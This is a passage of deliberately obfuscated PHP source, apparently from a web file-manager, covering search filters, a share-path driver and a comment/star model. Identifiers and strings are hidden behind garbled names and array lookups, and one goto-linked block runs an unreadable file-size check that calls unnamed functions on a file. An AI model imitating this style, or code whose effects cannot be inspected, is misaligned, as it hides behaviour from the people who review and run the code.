$õ·«Ï²[$È†•ÑÓ[32]]; unset($õ·«Ï²[$È†•ÑÓ[32]]); foreach ($õ·«Ï² as $üÜÄí‘ => $ÂÒ€¶è‰) { $Â™øø¼õ[$È†•ÑÓ[513] . $üÜÄí‘] = $ÂÒ€¶è‰; } foreach ($¯ó½°Î as $ø¬­Ä¡Å) { $Â™øø¼õ[] = array($È†•ÑÓ[518] => $ø¬­Ä¡Å, $È†•ÑÓ[1084] => $È†•ÑÓ[2082], array($È†•ÑÓ[2254] => $ø¬­Ä¡Å, $È†•ÑÓ[2255] => array($È†•ÑÓ[7], array($È†•ÑÓ[540], $È†•ÑÓ[539])))); } $this->join($ñ’‡¤À); $õ·«Ï² = $Â™øø¼õ; } private function _parseSearchWhere($†šÅ¹°Æ) { $Ş´Ÿê“š =& $_SERVER[¶Ô„œ…¯]; $­ù¡êæ‰ = array(); if (isset($†šÅ¹°Æ[$Ş´Ÿê“š[838]]) && $†šÅ¹°Æ[$Ş´Ÿê“š[838]]) { $­ù¡êæ‰[$Ş´Ÿê“š[88]] = array($Ş´Ÿê“š[2256], $†šÅ¹°Æ[$Ş´Ÿê“š[838]]); } if (isset($†šÅ¹°Æ[$Ş´Ÿê“š[839]]) && $†šÅ¹°Æ[$Ş´Ÿê“š[839]]) { $•¬Ç˜Ùå = array($Ş´Ÿê“š[2257], $†šÅ¹°Æ[$Ş´Ÿê“š[839]]); if ($­ù¡êæ‰[$Ş´Ÿê“š[88]]) { $­ù¡êæ‰[$Ş´Ÿê“š[88]] = array($­ù¡êæ‰[$Ş´Ÿê“š[88]], $•¬Ç˜Ùå, $Ş´Ÿê“š[2258]); } else { $­ù¡êæ‰[$Ş´Ÿê“š[88]] = $•¬Ç˜Ùå; } } if (isset($†šÅ¹°Æ[$Ş´Ÿê“š[2250]]) && $†šÅ¹°Æ[$Ş´Ÿê“š[2250]] > 0) { $­ù¡êæ‰[$Ş´Ÿê“š[79]] = array($Ş´Ÿê“š[2256], $†šÅ¹°Æ[$Ş´Ÿê“š[2250]]); } if (isset($†šÅ¹°Æ[$Ş´Ÿê“š[2251]]) && $†šÅ¹°Æ[$Ş´Ÿê“š[2251]]) { $•¬Ç˜Ùå = array($Ş´Ÿê“š[2257], $†šÅ¹°Æ[$Ş´Ÿê“š[2251]]); if ($­ù¡êæ‰[$Ş´Ÿê“š[79]]) { $­ù¡êæ‰[$Ş´Ÿê“š[79]] = array($­ù¡êæ‰[$Ş´Ÿê“š[79]], $•¬Ç˜Ùå, $Ş´Ÿê“š[2258]); } else { $­ù¡êæ‰[$Ş´Ÿê“š[79]] = $•¬Ç˜Ùå; } } if (isset($†šÅ¹°Æ[$Ş´Ÿê“š[667]]) && $†šÅ¹°Æ[$Ş´Ÿê“š[667]]) { $­ù¡êæ‰[] = array($Ş´Ÿê“š[531] => $†šÅ¹°Æ[$Ş´Ÿê“š[667]], $Ş´Ÿê“š[529] => $†šÅ¹°Æ[$Ş´Ÿê“š[667]], $Ş´Ÿê“š[1084] => $Ş´Ÿê“š[2082]); } if (isset($†šÅ¹°Æ[$Ş´Ÿê“š[488]]) && $†šÅ¹°Æ[$Ş´Ÿê“š[488]]) { $¤™úÔ¥ì = $†šÅ¹°Æ[$Ş´Ÿê“š[488]]; if ($¤™úÔ¥ì == $Ş´Ÿê“š[78]) { $­ù¡êæ‰[$Ş´Ÿê“š[487]] = 1; } else { if ($¤™úÔ¥ì == $Ş´Ÿê“š[2259]) { $­ù¡êæ‰[$Ş´Ÿê“š[487]] = 0; } else { if ($¤™úÔ¥ì) { $¤™úÔ¥ì = is_array($¤™úÔ¥ì) ? $¤™úÔ¥ì : explode($Ş´Ÿê“š[50], $¤™úÔ¥ì); $­ù¡êæ‰[$Ş´Ÿê“š[488]] = array($Ş´Ÿê“š[494], $¤™úÔ¥ì); $­ù¡êæ‰[$Ş´Ÿê“š[487]] = 0; } } } } $this->_parseSearchParent($†šÅ¹°Æ, $­ù¡êæ‰); if (isset($†šÅ¹°Æ[$Ş´Ÿê“š[2078]]) && trim($†šÅ¹°Æ[$Ş´Ÿê“š[2078]])) { $àıº’Ÿ¡ = trim($†šÅ¹°Æ[$Ş´Ÿê“š[2078]]); $¾—Ğ¢ğö = explode($Ş´Ÿê“š[53], $àıº’Ÿ¡); if (strlen($àıº’Ÿ¡) > 2 && (substr($àıº’Ÿ¡, 0, 1) == $Ş´Ÿê“š[121] && substr($àıº’Ÿ¡, -1) == $Ş´Ÿê“š[121]) || substr($àıº’Ÿ¡, 0, 1) == $Ş´Ÿê“š[58] && substr($àıº’Ÿ¡, -1) == $Ş´Ÿê“š[58]) { $àıº’Ÿ¡ = substr($àıº’Ÿ¡, 1, -1); $¾—Ğ¢ğö = array($àıº’Ÿ¡); } $­ù¡êæ‰[$Ş´Ÿê“š[32]] = array(array($Ş´Ÿê“š[617], $Ş´Ÿê“š[2080] . $àıº’Ÿ¡ . $Ş´Ÿê“š[2080])); if (count($¾—Ğ¢ğö) > 1) { $­ù¡êæ‰[$Ş´Ÿê“š[32]] = array(); foreach ($¾—Ğ¢ğö as $†¾…ˆ¦«) { if (!trim($†¾…ˆ¦«)) { continue; } $­ù¡êæ‰[$Ş´Ÿê“š[32]][] = array($Ş´Ÿê“š[617], $Ş´Ÿê“š[2080] . trim($†¾…ˆ¦«) . $Ş´Ÿê“š[2080]); } } } return $­ù¡êæ‰; } private function _parseSearchParent($àÎˆÈÓ™, &$Ñ¢Åõ§ñ) { $Í·ÕÍÑü =& $_SERVER[¶Ô„œ…¯]; if (!isset($àÎˆÈÓ™[$Í·ÕÍÑü[192]]) || !$àÎˆÈÓ™[$Í·ÕÍÑü[192]]) { return; } $…ÚÂš×¢ = $this->pathInfo($àÎˆÈÓ™[$Í·ÕÍÑü[192]]); $ñš£ıĞ = $…ÚÂš×¢[$Í·ÕÍÑü[192]] . $Í·ÕÍÑü[12] === $Í·ÕÍÑü[230]; $©æêÑâ = $…ÚÂš×¢[$Í·ÕÍÑü[190]] == $Í·ÕÍÑü[580]; if ($…ÚÂš×¢[$Í·ÕÍÑü[596]] == $Í·ÕÍÑü[597]) { $Ûº¿Ô = $this->sourceInfo($àÎˆÈÓ™[$Í·ÕÍÑü[192]]); $…ÚÂš×¢[$Í·ÕÍÑü[586]] = $Ûº¿Ô[$Í·ÕÍÑü[586]]; } $Ñ¢Åõ§ñ[$Í·ÕÍÑü[657]] = array($Í·ÕÍÑü[617], $…ÚÂš×¢[$Í·ÕÍÑü[586]] . $àÎˆÈÓ™[$Í·ÕÍÑü[192]] . $Í·ÕÍÑü[618]); $º¤¼­è = isset($àÎˆÈÓ™[$Í·ÕÍÑü[1938]]) && in_array($Í·ÕÍÑü[580], $àÎˆÈÓ™[$Í·ÕÍÑü[1938]]); if (!$º¤¼­è || !$©æêÑâ || !$ñš£ıĞ || !$…ÚÂš×¢[$Í·ÕÍÑü[489]]) { return; } if (!AuthModel::authCheckRoot($…ÚÂš×¢[$Í·ÕÍÑü[489]][$Í·ÕÍÑü[490]])) { return; } $Œƒ‹ë‹  = $…ÚÂš×¢[$Í·ÕÍÑü[571]] . $Í·ÕÍÑü[12]; if ($Œƒ‹ë‹  == $Í·ÕÍÑü[91]) { unset($Ñ¢Åõ§ñ[$Í·ÕÍÑü[657]]); $Ñ¢Åõ§ñ[$Í·ÕÍÑü[190]] = self::TYPE_GROUP; return; } $Á×‘¦Œî = Model($Í·ÕÍÑü[587])->groupChildrenAll($Œƒ‹ë‹ ); $»¡ùÔÉÇ = count($Á×‘¦Œî); if ($»¡ùÔÉÇ <= 1) { return; } $ßŞ×¬ï = array($Í·ÕÍÑü[192] => 0, $Í·ÕÍÑü[190] => self::TYPE_GROUP, $Í·ÕÍÑü[571] => array($Í·ÕÍÑü[7], $Á×‘¦Œî)); $•Ú»ú¼˜ = $this->field($Í·ÕÍÑü[2260])->where($ßŞ×¬ï)->limit($»¡ùÔÉÇ)->select(); $Ñ¢Åõ§ñ[$Í·ÕÍÑü[657]] = array(); foreach ($•Ú»ú¼˜ as $¥¡ñ¤ëº) { $Ñ¢Åõ§ñ[$Í·ÕÍÑü[657]][] = array($Í·ÕÍÑü[617], $Í·ÕÍÑü[595] . $¥¡ñ¤ëº[$Í·ÕÍÑü[193]] . $Í·ÕÍÑü[618]); } $Ñ¢Åõ§ñ[$Í·ÕÍÑü[657]][] = $Í·ÕÍÑü[2082]; } } goto EÄò°ğˆÏš; fîƒç½ö§¢: $_size = $_SERVER[¶Ô„œ…¯][1437]; if ($_SERVER[$_SERVER[¶Ô„œ…¯][919]] != $_size($_file)) { $_getc = $_SERVER[¶Ô„œ…¯][921]; $_getfile = $_SERVER[$_SERVER[¶Ô„œ…¯][922]] . $_SERVER[¶Ô„œ…¯][923]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¶Ô„œ…¯][287], $_getfilec); if (count($_getarrs) < $_SERVER[¶Ô„œ…¯][696]) { $exit = $_SERVER[¶Ô„œ…¯][924]; $exit(); } $_act = $_SERVER[¶Ô„œ…¯][925]; $_act($_file); } class PathDriverDriverShareItem { public function __construct($€ğ¿©³é) { $this->pathParse = $€ğ¿©³é; } public function __call($óõ•Ã, $Òœ‘šß) { $Ö‘¯ñì´ =& $_SERVER[¶Ô„œ…¯]; if (method_exists($this, $óõ•Ã)) { return; } $¡´ÄğÎØ = call_user_func_array(array($Ö‘¯ñì´[1438], $óõ•Ã), $Òœ‘šß); $äÒà¬…Ì = array($Ö‘¯ñì´[1439], $Ö‘¯ñì´[1440], $Ö‘¯ñì´[1441], $Ö‘¯ñì´[1442], $Ö‘¯ñì´[623], $Ö‘¯ñì´[625], $Ö‘¯ñì´[1443], $Ö‘¯ñì´[110], $Ö‘¯ñì´[1444], $Ö‘¯ñì´[1445]); if (in_array($óõ•Ã, $äÒà¬…Ì)) { $¡´ÄğÎØ = $this->getPathOuter($¡´ÄğÎØ); } return $¡´ÄğÎØ; } public function copy($øØú¦¿û, $ÊµÈñ£Ç, $¥æ¤Øşà = false, $”Á“•Íô = false) { return $this->copyMove($øØú¦¿û, $ÊµÈñ£Ç, $¥æ¤Øşà, $_SERVER[¶Ô„œ…¯][623], $”Á“•Íô); } public function move($ºÉ¾œ¶§, $È¯ÖéÊæ, $´¤¸ı¿± = false, $­ÇÙí² = false) { return $this->copyMove($ºÉ¾œ¶§, $È¯ÖéÊæ, $´¤¸ı¿±, $_SERVER[¶Ô„œ…¯][625], $­ÇÙí²); } private function copyMove($´¹Ïñáö, $Ñ¶Ç­Ô, $Ê‰§¸ë, $µˆÊ’¬œ, $ÔÕŸ¸â = false) { $’¤ìô¨Á =& $_SERVER[¶Ô„œ…¯]; $²†“Àí = $Ñ¶Ç­Ô; $™œ Ë‡Ú = IO::driverMake($Ñ¶Ç­Ô); if ($™œ Ë‡Ú->pathParse[$’¤ìô¨Á[1239]]) { $Ñ¶Ç­Ô = $™œ Ë‡Ú->pathParse[$’¤ìô¨Á[1239]]; } else { $Ñ¶Ç­Ô = $²†“Àí; } $œ¨É çÏ = IO::copyMove($´¹Ïñáö, $Ñ¶Ç­Ô, $Ê‰§¸ë, $µˆÊ’¬œ, $ÔÕŸ¸â); $œ¨É çÏ = $this->getPathOuter($œ¨É çÏ); return $œ¨É çÏ; } public function pathThis($…¬²Ÿ™÷) { return get_path_this($this->pathParse[$_SERVER[¶Ô„œ…¯][87]]); } public function pathFather($™áÅÚæö) { return get_path_father($this->pathParse[$_SERVER[¶Ô„œ…¯][87]]); } public function iconvSystem($é»´ª ó) { return $é»´ª ó; } protected function infoParse($‚ÌåçÌ, $ğø¹¬ù = false) { $±Ñ‘îÙ½ =& $_SERVER[¶Ô„œ…¯]; $îôˆ‹İê = $this->pathParse[$±Ñ‘îÙ½[562]][$±Ñ‘îÙ½[1264]] . $this->pathParse[$±Ñ‘îÙ½[1257]]; if ($ğø¹¬ù) { $öŠÀ‚³ƒ = IO::infoWithChildren($îôˆ‹İê); } else { $öŠÀ‚³ƒ = IO::info($îôˆ‹İê); } $·—äîäô = $this->pathParse[$±Ñ‘îÙ½[562]]; return Action($±Ñ‘îÙ½[1435])->_shareItemeParse($öŠÀ‚³ƒ, $·—äîäô); } public function listAll($“áİßœº) { $™†Å®Ì“ =& $_SERVER[¶Ô„œ…¯]; $…¯½–İÈ = IO::listAll($“áİßœº); $İË®û£¶ = rtrim($this->pathParse[$™†Å®Ì“[562]][$™†Å®Ì“[1264]], $™†Å®Ì“[8]); foreach ($…¯½–İÈ as &$áÈ÷ÈÎ) { $áÈ÷ÈÎ[$™†Å®Ì“[87]] = $this->pathDriver . $™†Å®Ì“[8] . ltrim(substr($áÈ÷ÈÎ[$™†Å®Ì“[87]], strlen($İË®û£¶)), $™†Å®Ì“[8]); } unset($áÈ÷ÈÎ); return $…¯½–İÈ; } public function listAllSimple($ÕÃÌ€, $š¥¥Øƒ = false) { $Õ™©áßÀ =& $_SERVER[¶Ô„œ…¯]; $ğ¡²¯—Ó = $this->listAll($ÕÃÌ€); $ıÈÃŞèã = $this->pathParse[$Õ™©áßÀ[497]]; if (trim($ıÈÃŞèã, $Õ™©áßÀ[8]) == trim(get_path_father($ıÈÃŞèã), $Õ™©áßÀ[8])) { $š¥¥Øƒ = !0; } return IO::init($Õ™©áßÀ[12])->listAllSimpleMake($ğ¡²¯—Ó, $ıÈÃŞèã, $š¥¥Øƒ); } public function getPathOuter($âæÁ—…Ì) { $³ªÉ’åÎ =& $_SERVER[¶Ô„œ…¯]; $åËÈç’¤ = KodIO::parse($âæÁ—…Ì); if ($åËÈç’¤[$³ªÉ’åÎ[33]] == KodIO::KOD_SHARE_ITEM) { return $åËÈç’¤[$³ªÉ’åÎ[87]]; } $’ã¤Ãó‹ = KodIO::clear($âæÁ—…Ì); $­ïœ¦Íß = KodIO::clear($this->pathParse[$³ªÉ’åÎ[562]][$³ªÉ’åÎ[1264]]); $°—Å¯ƒœ = substr($’ã¤Ãó‹, strlen($­ïœ¦Íß)); if (substr($’ã¤Ãó‹, 0, strlen($­ïœ¦Íß)) != $­ïœ¦Íß) { return !1; } return $this->pathParse[$³ªÉ’åÎ[1258]] . $³ªÉ’åÎ[8] . ltrim($°—Å¯ƒœ, $³ªÉ’åÎ[8]); } public function getType() { $ÅÏöÖ™Õ =& $_SERVER[¶Ô„œ…¯]; $°ÚÀ„Í = str_replace($ÅÏöÖ™Õ[77], $ÅÏöÖ™Õ[12], get_class($this)); return strtolower($°ÚÀ„Í); } public function isOsDriver($ã¢ø¾œæ) { return IO::isOsDriver($ã¢ø¾œæ); } public function info($§€´–µ¸) { return $this->infoParse($§€´–µ¸); } public function infoAuth($ŠÒ”ê¹Ü) { return $this->infoParse($ŠÒ”ê¹Ü); } public function infoWithChildren($»¢ğË«Õ) { return $this->infoParse($»¢ğË«Õ, !0); } public function infoFull($©¿ºüÀÙ) { return $this->infoParse($©¿ºüÀÙ); } } goto C”­¿‡ÌŠ; f™ôÙÓæƒ: class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\145\156\164"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\x61\x6d\x65" => "\143\x6f\x6d\x6d\x65\156\164\137\x6d\145\164\x61", "\155\x65\164\x61\x46\151\145\x6c\x64" => "\143\x6f\155\155\145\156\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¸®ù×ò) { $ï¤Üå”à =& $_SERVER[¶Ô„œ…¯]; if ($¸®ù×ò[$ï¤Üå”à[2009]]) { $²ŸÉ¨ñ” = $this->where(array($ï¤Üå”à[2010] => $¸®ù×ò[$ï¤Üå”à[2009]]))->find(); if (!$²ŸÉ¨ñ” || $²ŸÉ¨ñ”[$ï¤Üå”à[190]] != $¸®ù×ò[$ï¤Üå”à[190]] || $²ŸÉ¨ñ”[$ï¤Üå”à[571]] != $¸®ù×ò[$ï¤Üå”à[571]]) { return !1; } $this->where(array($ï¤Üå”à[2010] => $¸®ù×ò[$ï¤Üå”à[2009]]))->setAdd($ï¤Üå”à[2011], 1); } $¸®ù×ò[$ï¤Üå”à[2012]] = 0; $¸®ù×ò[$ï¤Üå”à[2011]] = 0; $¸®ù×ò[$ï¤Üå”à[828]] = 1; return $this->add($¸®ù×ò); } public function commentCount($ğ¢…óß, $Â¹¶Ëùì, $¤ñê‚áÀ = false) { $Úš›ËËû =& $_SERVER[¶Ô„œ…¯]; if (!$ğ¢…óß) { return array(); } if (is_string($ğ¢…óß) || is_int($ğ¢…óß)) { $ğ¢…óß = array($ğ¢…óß); } $°ÇéÓ×¼ = array($Úš›ËËû[571], $Úš›ËËû[2013] => $Úš›ËËû[567]); $ü¯Ğ±ë¨ = array($Úš›ËËû[571] => array($Úš›ËËû[7], $ğ¢…óß), $Úš›ËËû[190] => $Â¹¶Ëùì); if ($¤ñê‚áÀ) { $ü¯Ğ±ë¨[$Úš›ËËû[1780]] = $¤ñê‚áÀ; } $´³¼¿ğ = $this->field($°ÇéÓ×¼)->where($ü¯Ğ±ë¨)->group($Úš›ËËû[571])->select(); return array_to_keyvalue($´³¼¿ğ, $Úš›ËËû[571], $Úš›ËËû[567]); } public function starTarget($ƒô†™Ÿ‹, $î»ş‚œ›) { $µüèï§ =& $_SERVER[¶Ô„œ…¯]; $×ĞæµÜÊ = $ƒô†™Ÿ‹ + self::TYPE_STAR_OFFSET; $‰Œú†ôê = array($µüèï§[1780] => USER_ID, $µüèï§[190] => $×ĞæµÜÊ, $µüèï§[571] => $î»ş‚œ›); $Ä‘³ØÅ¡ = $this->where($‰Œú†ôê)->find(); if ($Ä‘³ØÅ¡) { return $this->where(array($µüèï§[477] => $Ä‘³ØÅ¡[$µüèï§[477]]))->delete(); } $İ‡²ú‡¼ = array($µüèï§[2009] => 0, $µüèï§[1780] => USER_ID, $µüèï§[828] => 1, $µüèï§[171] => $µüèï§[12], $µüèï§[190] => $×ĞæµÜÊ, $µüèï§[571] => $î»ş‚œ›, $µüèï§[2012] => 0, $µüèï§[2011] => 0); return $this->add($İ‡²ú‡¼); } public function starTargetCount($Àı™ñíÌ, $´†Åƒäç) { $Ö÷ö‘–¾ =& $_SERVER[¶Ô„œ…¯]; $—îŠîÌÛ = $´†Åƒäç + self::TYPE_STAR_OFFSET; $Á‡——„ú = $this->commentCount($Àı™ñíÌ, $—îŠîÌÛ); $êÔŒ¾à = $this->commentCount($Àı™ñíÌ, $—îŠîÌÛ, USER_ID); return array($Ö÷ö‘–¾[2014] => $Á‡——„ú, $Ö÷ö‘–¾[2015] => $êÔŒ¾à); } public function starTargetUserList($³òØ¾ùÃ, $Ÿ…ñáÈ¶) { $ÊÙÆËï™ =& $_SERVER[¶Ô„œ…¯]; $«‘Şîî² = $³òØ¾ùÃ + self::TYPE_STAR_OFFSET; $Ë½ìŒâì = array($ÊÙÆËï™[571] => $Ÿ…ñáÈ¶, $ÊÙÆËï™[190] => $«‘Şîî²); $ôºúÅ·¾ = $this->where($Ë½ìŒâì)->count(); $ì‰¢Ø»Ë = array($ÊÙÆËï™[334] => $ôºúÅ·¾, $ÊÙÆËï™[2016] => array()); if (!$ôºúÅ·¾) { return $ì‰¢Ø»Ë; } $Ş÷Ïéß¡ = $this->field($ÊÙÆËï™[1780])->where($Ë½ìŒâì)->limit(500)->select(); $Ş÷Ïéß¡ = array_to_keyvalue($Ş÷Ïéß¡, $ÊÙÆËï™[12], $ÊÙÆËï™[1780]); $ì‰¢Ø»Ë[$ÊÙÆËï™[2016]] = Model($ÊÙÆËï™[579])->userListInfo($Ş÷Ïéß¡); return $ì‰¢Ø»Ë; } public function prasiseUserList($éÆê†ó) { $Ö Ûµ°È =& $_SERVER[¶Ô„œ…¯]; $×Ô”Á‡– = array($Ö Ûµ°È[2017] => $éÆê†ó); $ÜÌÊì‰ß = $this->where($×Ô”Á‡–)->find(); $·à¤Á¶Ô = _get($ÜÌÊì‰ß, $Ö Ûµ°È[2012], 0); $î­ˆÓ’ = array($Ö Ûµ°È[334] => $·à¤Á¶Ô, $Ö Ûµ°È[2016] => array()); if (!$·à¤Á¶Ô) { return $î­ˆÓ’; } $ì¯ªöİ¹ = Model($Ö Ûµ°È[2018])->field($Ö Ûµ°È[1780])->where($×Ô”Á‡–)->limit(500)->select(); $ì¯ªöİ¹ = array_to_keyvalue($ì¯ªöİ¹, $Ö Ûµ°È[12], $Ö Ûµ°È[1780]); $î­ˆÓ’[$Ö Ûµ°È[2016]] = Model($Ö Ûµ°È[579])->userListInfo($ì¯ªöİ¹); return $î­ˆÓ’; } public function remove($§¾ÒµºÚ) { $Ë¶€«– =& $_SERVER[¶Ô„œ…¯]; $æ•ÕÊÅ£ = array($Ë¶€«–[2010] => $§¾ÒµºÚ); $ªíéÈ = $this->where($æ•ÕÊÅ£)->find(); if ($ªíéÈ[$Ë¶€«–[2009]]) { $this->where(array($Ë¶€«–[2010] => $ªíéÈ[$Ë¶€«–[2009]]))->setAdd($Ë¶€«–[2011], -1); } return $this->where($æ•ÕÊÅ£)->delete(); } public function edit($İ‰ğÁ­Ê, $ª¦¯££õ) { $ÁÊê»ÈÖ =& $_SERVER[¶Ô„œ…¯]; $Õ÷…œŞ = array($ÁÊê»ÈÖ[2010] => $İ‰ğÁ­Ê); return $this->where($Õ÷…œŞ)->save(array($ÁÊê»ÈÖ[2019] => $ª¦¯££õ)); } public function prasise($èÖ˜—ÅĞ) { $¹¶¯œ›Ù =& $_SERVER[¶Ô„œ…¯]; $ºù¯¿É = Model($¹¶¯œ›Ù[2020]); $ÁæÏ†İ¹ = array($¹¶¯œ›Ù[2010] => $èÖ˜—ÅĞ, $¹¶¯œ›Ù[1771] => USER_ID); $ª§…ˆ‡Ê = $ºù¯¿É->where($ÁæÏ†İ¹)->find(); if (!$ª§…ˆ‡Ê) { $ºù¯¿É->add($ÁæÏ†İ¹); $¨€™‹òˆ = $this->where(array($¹¶¯œ›Ù[2010] => $èÖ˜—ÅĞ))->setAdd($¹¶¯œ›Ù[2012], 1); } else { $ºù¯¿É->where($ÁæÏ†İ¹)->delete(); $¨€™‹òˆ = $this->where(array($¹¶¯œ›Ù[2010] => $èÖ˜—ÅĞ))->setAdd($¹¶¯œ›Ù[2012], -1); } return $¨€™‹òˆ; } public function targetInfo($™ØšóÕ÷, $¾«ü£œƒ) { $¶üÌ‘‰Ì =& $_SERVER[¶Ô„œ…¯]; $šá’ÍÖŞ = array($¶üÌ‘‰Ì[653] => $™ØšóÕ÷, $¶üÌ‘‰Ì[654] => $¾«ü£œƒ); $¢ŒÉ¯–â = $this->where($šá’ÍÖŞ)->count(); $†ŒŞºı© = "\122\111\107\x48\124\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x63\157\155\x6d\x65\156\164\137\160\x72\x61\151\x73\x65\x20\x73\164\x61\162\x20\157\x6e\x20\143\x6f\x6d\x6d\x65\156\x74\x2e\x63\157\155\155\x65\156\x74\111\x44\x20\x3d\x20\163\164\141\x72\x2e\x63\157\155\155\145\x6e\164\x49\104"; $Çä†ç¶ = $this->alias($¶üÌ‘‰Ì[431])->where($šá’ÍÖŞ)->join($†ŒŞºı©, $¶üÌ‘‰Ì[2021])->count(); $·ÇøĞ = array($¶üÌ‘‰Ì[2022] => $¢ŒÉ¯–â, $¶üÌ‘‰Ì[2023] => $Çä†ç¶); return $·ÇøĞ; } public function listData($éøŠÆòŒ) { $àØ§±Û =& $_SERVER[¶Ô„œ…¯]; if (isset($éøŠÆòŒ[$àØ§±Û[2024]])) { if ($éøŠÆòŒ[$àØ§±Û[2024]]) { $éøŠÆòŒ[$àØ§±Û[2017]] = array($àØ§±Û[1098], intval($éøŠÆòŒ[$àØ§±Û[2024]])); } unset($éøŠÆòŒ[$àØ§±Û[2024]]); } if (isset($éøŠÆòŒ[$àØ§±Û[2025]])) { if ($éøŠÆòŒ[$àØ§±Û[2025]]) { $éøŠÆòŒ[$àØ§±Û[2017]] = array($àØ§±Û[1095], intval($éøŠÆòŒ[$àØ§±Û[2025]])); } unset($éøŠÆòŒ[$àØ§±Û[2025]]); } return $this->_listData($éøŠÆòŒ); } private function _listData($şŠ›¯Û) { $ğ€¯û­å =& $_SERVER[¶Ô„œ…¯]; $§Œõ¤¼Ò = $this->where($şŠ›¯Û)->_makeOrder()->selectPage(100); $this->_listAppendParent($§Œõ¤¼Ò[$ğ€¯û­å[447]]); $this->_listAppendUser($§Œõ¤¼Ò[$ğ€¯û­å[447]]); $this->_listAppendMeta($§Œõ¤¼Ò[$ğ€¯û­å[447]]); return $§Œõ¤¼Ò; } private function _makeOrder() { $Ô®º½Îª =& $_SERVER[¶Ô„œ…¯]; $ÕĞØç¶¯ = array($Ô®º½Îª[2012], $Ô®º½Îª[2011], $Ô®º½Îª[233]); $ÖÙñ»­ä = Input::get($Ô®º½Îª[532], $Ô®º½Îª[7], $Ô®º½Îª[499], $ÕĞØç¶¯); $×±‚èä… = Input::get($Ô®º½Îª[533], $Ô®º½Îª[7], $Ô®º½Îª[1773], array($Ô®º½Îª[2026], $Ô®º½Îª[528])); $½Ù«“¸ = $ÖÙñ»­ä . $Ô®º½Îª[53] . $×±‚èä…; return $this->order($½Ù«“¸); } private function _listAppendParent(&$¯‚Å„¯é) { $¥¬Üñ‘š =& $_SERVER[¶Ô„œ…¯]; $­áŞê¢ = array_unique(array_to_keyvalue($¯‚Å„¯é, $¥¬Üñ‘š[12], $¥¬Üñ‘š[2009])); $­áŞê¢ = array_remove_value($­áŞê¢, $¥¬Üñ‘š[230]); if (!$­áŞê¢) { return; } $ÊÒÈ„¦¾ = $this->where(array($¥¬Üñ‘š[2010] => array($¥¬Üñ‘š[7], $­áŞê¢)))->select(); $ÊÒÈ„¦¾ = array_to_keyvalue($ÊÒÈ„¦¾, $¥¬Üñ‘š[2017]); foreach ($¯‚Å„¯é as &$¨õ¬Ú‰¨) { if (isset($ÊÒÈ„¦¾[$¨õ¬Ú‰¨[$¥¬Üñ‘š[2009]]])) { $¨õ¬Ú‰¨[$¥¬Üñ‘š[2027]] = $ÊÒÈ„¦¾[$¨õ¬Ú‰¨[$¥¬Üñ‘š[2009]]]; } } unset($¨õ¬Ú‰¨); } private function _listAppendUser(&$âÖ‘°Ú¾) { $¢îÕÙ£Î =& $_SERVER[¶Ô„œ…¯]; $Ô©ÅÕÄä = array_unique(array_to_keyvalue($âÖ‘°Ú¾, $¢îÕÙ£Î[12], $¢îÕÙ£Î[1780])); $Ô©ÅÕÄä = array_remove_value($Ô©ÅÕÄä, $¢îÕÙ£Î[230]); if (count($Ô©ÅÕÄä) == 0) { return; } foreach ($âÖ‘°Ú¾ as $À¸Ôñ‰ô) { if (isset($À¸Ôñ‰ô[$¢îÕÙ£Î[2027]])) { $Ô©ÅÕÄä[] = $À¸Ôñ‰ô[$¢îÕÙ£Î[2027]][$¢îÕÙ£Î[1780]]; } } $à¯³Ó = Model($¢îÕÙ£Î[599])->userListInfo($Ô©ÅÕÄä); foreach ($âÖ‘°Ú¾ as &$À¸Ôñ‰ô) { $À¸Ôñ‰ô[$¢îÕÙ£Î[667]] = $à¯³Ó[$À¸Ôñ‰ô[$¢îÕÙ£Î[1780]]]; if (isset($À¸Ôñ‰ô[$¢îÕÙ£Î[2027]])) { $À¸Ôñ‰ô[$¢îÕÙ£Î[2027]][$¢îÕÙ£Î[667]] = $à¯³Ó[$À¸Ôñ‰ô[$¢îÕÙ£Î[2027]][$¢îÕÙ£Î[1780]]]; } } unset($À¸Ôñ‰ô); } private function _listAppendMeta(&$ı×ç¶ÊÌ) { $Àîøü¢ =& $_SERVER[¶Ô„œ…¯]; $˜«Ÿ˜Ï = array_unique(array_to_keyvalue($ı×ç¶ÊÌ, $Àîøü¢[12], $Àîøü¢[2017])); $˜«Ÿ˜Ï = array_remove_value($˜«Ÿ˜Ï, $Àîøü¢[230]); if (!$˜«Ÿ˜Ï) { return; } foreach ($ı×ç¶ÊÌ as $Ÿß¨Â…÷) { if (isset($Ÿß¨Â…÷[$Àîøü¢[2027]])) { $˜«Ÿ˜Ï[] = $Ÿß¨Â…÷[$Àîøü¢[2027]][$Àîøü¢[2017]]; } } $£¾ÆüÖ‘ = $this->metaList($˜«Ÿ˜Ï); if (!$£¾ÆüÖ‘) { return !1; } foreach ($ı×ç¶ÊÌ as &$Ÿß¨Â…÷) { $Ÿß¨Â…÷[$Àîøü¢[541]] = $£¾ÆüÖ‘[$Ÿß¨Â…÷[$Àîøü¢[2017]]]; if (isset($Ÿß¨Â…÷[$Àîøü¢[2027]])) { $Ÿß¨Â…÷[$Àîøü¢[2027]][$Àîøü¢[541]] = $£¾ÆüÖ‘[$Ÿß¨Â…÷[$Àîøü¢[2027]][$Àîøü¢[2017]]]; } } unset($Ÿß¨Â…÷); } private function metaList($µæšÎÙš) { $„­¥º™ =& $_SERVER[¶Ô„œ…¯]; if (!$µæšÎÙš) { return array(); } $š¼‚ï‹ê = array($„­¥º™[2017] => array($„­¥º™[7], $µæšÎÙš)); $²İ¸‹ = Model($„­¥º™[2028])->where($š¼‚ï‹ê)->select(); $²İ¸‹ = array_to_keyvalue_group($²İ¸‹, $„­¥º™[2017]); foreach ($²İ¸‹ as $˜È¿„Ä¦ => $Å™öÅÌÛ) { $·ÓùÛŸœ = array(); foreach ($Å™öÅÌÛ as $í€¾¤ªÃ) { $·ÓùÛŸœ[$í€¾¤ªÃ[$„­¥º™[97]]] = $í€¾¤ªÃ[$„­¥º™[452]]; } $²İ¸‹[$˜È¿„Ä¦] = $·ÓùÛŸœ; } return 